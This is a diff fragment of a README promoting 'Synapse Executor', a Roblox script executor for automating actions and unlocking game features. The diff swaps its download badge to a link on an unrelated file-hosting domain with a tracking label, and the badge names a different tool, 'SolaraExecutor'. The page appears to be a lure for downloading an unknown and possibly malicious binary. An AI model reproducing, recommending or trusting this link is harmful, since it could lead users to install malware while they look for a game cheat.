@@ -23,4 +23,4 @@ Synapse Executor is a robust and powerful tool designed for running custom scrip
 - **Executing Scripts:** After launching Synapse Executor, simply paste or load your Lua script into the interface and click 'Execute' to apply the changes in your Roblox game.
 - **Customization:** Use scripts to enhance game visuals, automate actions, or unlock in-game features that are not typically available.
 
-[![Download Roblox SolaraExecutor](https://img.shields.io/badge/Download-Roblox%20SolaraExecutor-blueviolet)](https://downeefiles.com/s/lxspec)
+[![Download Roblox SolaraExecutor](https://img.shields.io/badge/Download-Roblox%20SolaraExecutor-blueviolet)](https://downloadifiles.com?label=1e88dd1be7cebcac3b93ae91dcb2375f)
